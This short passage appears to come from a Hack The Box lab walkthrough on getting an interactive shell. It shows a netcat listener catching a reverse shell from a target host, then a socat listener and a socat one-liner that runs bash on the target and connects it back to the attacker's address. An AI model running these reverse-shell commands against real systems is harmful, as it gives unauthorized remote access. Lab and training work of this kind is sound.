...
EssMack90@htb[/htb]`$ nc -nvlp 8443  listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496 id uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)` 
...
EssMack90@htb[/htb]``$ socat file:`tty`,raw,echo=0 tcp-listen:4443``

Next, we'll execute a Socat one-liner on the target host.

EssMack90@htb[/htb]`$ nc -lnvp 8443  listening on [any] 8443 ... connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443`
